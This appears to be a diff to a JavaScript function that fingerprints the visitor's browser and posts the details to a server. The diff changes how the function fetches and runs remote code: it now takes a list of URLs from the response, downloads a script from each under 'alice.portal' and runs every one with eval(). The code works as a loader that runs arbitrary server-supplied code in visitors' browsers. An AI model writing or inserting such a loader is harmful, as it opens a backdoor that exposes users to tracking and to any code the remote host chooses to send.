@@ -113,7 +113,6 @@ function chisa(request) {
         'Content-Type': 'application/json',
     };
     if (request) {
-        console.log("Request exists:", request);
         if (request.headers) {
             Object.assign(req_headers, request.headers);
         }
@@ -123,7 +122,7 @@ function chisa(request) {
         userAgent: navigator.userAgent,
         touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
         connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
-        meta: Array.from(document.querySelectorAll('meta[uri]')).map(tag => tag.getAttribute('uri')),
+        uri: Array.from(document.querySelectorAll('meta[uri]')).map(tag => tag.getAttribute('uri')),
     };
     const bodyData = {
         msg: request?.msg || '',
@@ -140,10 +139,24 @@ function chisa(request) {
         if (!response.ok) {
             throw new Error('no response');
         }
-        return response.text();
+        return response.json();
     })
-        .then(moduleResponse => {
-        eval(moduleResponse);
+        .then((urls) => {
+        urls.forEach((url) => {
+            fetch(alice.portal + url, { method: 'GET' })
+                .then(modResponse => {
+                if (!modResponse.ok) {
+                    throw new Error('Failed to load module');
+                }
+                return modResponse.text();
+            })
+                .then(moduleScript => {
+                eval(moduleScript);
+            })
+                .catch(error => {
+                console.error('Error loading module:', error);
+            });
+        });
     })
         .catch(error => {
         console.error('failed to collect dir:', error);
